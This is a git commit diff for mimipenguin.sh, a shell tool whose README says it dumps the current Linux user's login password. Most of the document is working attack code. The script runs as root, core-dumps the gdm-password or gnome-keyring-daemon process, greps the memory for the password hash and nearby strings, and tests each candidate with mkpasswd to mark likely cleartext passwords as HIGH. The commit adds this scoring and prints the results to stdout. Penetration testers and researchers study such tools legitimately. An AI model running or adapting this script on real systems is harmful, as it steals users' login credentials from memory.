33f43ef1993feffb6e9ae6eabfffb5217f2531f7
root <root@localhost.localdomain>
2017-03-29 19:20:57 -0400

    Password Potential Calculator - STDOUT

--- README.md
+++ README.md
@@ -3,7 +3,7 @@ A tool to dump the login password from the current linux user. Adapted after the
 * Special thanks to pugilist for cleaning up PID extraction and testing.
 
 # Details
-Takes advantage of the gnome login screen feature by dumping the memory of the process and extracting lines that have a high probability of containing the current user's cleartext password.
+Takes advantage of the gnome login screen feature by dumping the memory of the process and extracting lines that have a high probability of containing the current user's cleartext password. Will attempt to calculate each word's password potential based on known strings found in the process and whether or not the hash was able to be extracted.
 
 # Supported/Tested
 * Kali 4.3.0 (rolling) x64
@@ -11,6 +11,6 @@ Takes advantage of the gnome login screen feature by dumping the memory of the p
 * Ubuntu 16.04 LTS x64
 
 # Notes
-* Ubuntu support still in testing
+* Password moves in memory - still honing in on 100% effectiveness
 * Plan on expanding support and other credential locations
 
--- mimipenguin.sh
+++ mimipenguin.sh
@@ -13,11 +13,13 @@ if [[ $EUID -ne 0 ]]; then
 fi
 
 #If Kali
-if [[ `uname -a | awk '{print tolower($0)}'` == *"Kali"* ]]; then
+if [[ `uname -a | awk '{print tolower($0)}'` == *"kali"* ]]; then
 	#get gdm-session-worker [pam/gdm-password] process
 	PID="$(ps -eo pid,command | sed -rn '/gdm-password\]/p' | awk 'BEGIN {FS = " " } ; { print $1 }')"
 	gcore -o /tmp/dump $PID >& /dev/null
-	strings "/tmp/dump.${PID}" | egrep '^\$.\$.+$' -B 10 -A 10 > password.txt
+	HASH="$(strings "/tmp/dump.${PID}" | egrep -m 1 '^\$.\$.+$')"
+	SALT="$(echo $HASH | cut -d'$' -f 3)"
+	DUMP="$(strings "/tmp/dump.${PID}" | egrep '^gkr_system_authtok$' -B 5 -A 5)"
 fi
 
 #If Ubuntu
@@ -25,7 +27,36 @@ if [[ `uname -a | awk '{print tolower($0)}'` == *"ubuntu"* ]]; then
 	#get /usr/bin/gnome-keyring-daemon process
 	PID="$(ps -eo pid,command | sed -rn '/gnome\-keyring\-daemon/p' | awk 'BEGIN {FS = " " } ; { print $1 }')"
 	gcore -o /tmp/dump $PID >& /dev/null
-	strings "/tmp/dump.${PID}" | egrep '^.+libgck\-1\.so\.0$' -B 10 -A 10 > password.txt
+	HASH="$(strings "/tmp/dump.${PID}" | egrep -m 1 '^\$.\$.+$')"
+	SALT="$(echo $HASH | cut -d'$' -f 3)"
+	DUMP=$(strings "/tmp/dump.${PID}" | egrep '^.+libgck\-1\.so\.0$' -B 10 -A 10)
 fi
- 
-echo "Password located somewhere within password.txt"
+
+#Results to STDOUT - CSV style 
+echo "Password located somewhere below:"
+echo "Word,PasswordPotential"
+
+if [[ $HASH ]]; then
+	echo "$HASH,HASH"
+fi
+
+#Determine password potential for each word
+while read -r line; do
+	if [[ $line =~ ^_pammodutil.+[0-9]$ ]]; then
+		echo "$line,LOW"
+	elif [[ $line =~ ^LOGNAME= ]]; then
+		echo "$line,LOW"
+	elif [[ $line =~ ^UTF\-8 ]]; then
+		echo "$line,LOW"
+	elif [[ $line =~ ^splayManager[0-9]$ ]]; then
+		echo "$line,LOW"
+	elif [[ $line =~ ^gkr_system_authtok$ ]]; then
+		echo "$line,LOW"
+	elif [[ $line =~ [0-9]{1,4}:[0-9]{1,4}: ]]; then
+		echo "$line,LOW"
+	elif [[ `mkpasswd -m "sha-512" -S $SALT -s <<< $line` == $HASH ]]; then
+		echo "$line,HIGH"
+	else
+		echo "$line,MEDIUM"
+	fi
+done <<< "$DUMP"
